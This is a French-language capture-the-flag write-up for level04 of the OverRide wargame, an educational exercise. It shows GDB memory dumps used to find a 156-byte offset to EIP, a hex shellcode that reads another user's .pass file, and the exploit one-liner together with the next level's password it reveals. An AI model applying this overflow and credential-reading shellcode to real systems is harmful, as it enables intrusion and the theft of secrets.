Pour ce niveau on voit que la fonction gets est appelé on va pouvoir réécrir tout bêtement sur l'EIP. Les deux détails qui compliquent la chose sont :
    -> Le fork qui va faire une boucle infini lorsqu'on segfault et de plus nous empêcher de suivre le processus dans GDB mais on va pouvoir utiliser une option de GDB qui va suivre le processus du child process : set follow-fork-mode child.
    -> en essayant d'utiliser le même shellcode qu'à chaque exercice (execve) on va avoir le message :
        "no exec() for you"

Dans un premier temps pour trouver l'emplacement de l'EIP on va tout simplement  lancer le programme avec GDB avec le mode "set follow-fork-mode child" et calculer la taille du buffer en faisant (addresse EBP - addresse debut buffer) sachant que EIP se trouve juste après EBP on ajoute 4 et on sait la taille du payload nécessaire pour réécrire sur EIP : 

0xffffd650:     0xffffd670      0x00000000      0x00000000      0x00000000
0xffffd660:     0x00000b80      0x00000000      0xf7fdc714      0x00000000
0xffffd670:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd690:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6f0:     0x41414141      0x41414141      0x41414141      0x00000000
0xffffd700:     0xf7fceff4      0x00000000      0x00000000      0xf7e45513 <= EIP

Ce qui fait 160 en tout.

On a vu qu'on ne pouvait pas utiliser execve on va donc utiliser un shellcode qui va simplement aller read le contenu d'un fichier : (source : http://shell-storm.org/shellcode/files/shellcode-73.php)

export SHELLCODE=$(python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"')

on peut retrouver l'adresse de notre shellcode en lancant gdb, en regardant ou se trouve les \x90 au niveau de l'environement :

0xffffd8e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd900:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd910:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd920:     0x90909090      0x90909090      0x90909090      0x90909090

On choisira l'adresse 0xffffd900 => \x00\xd9\xff\xff

Plus qu'a lancer le programme level04 :

level04@OverRide:~$ python -c 'print"A"*156 + "\x00\xd9\xff\xff"' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...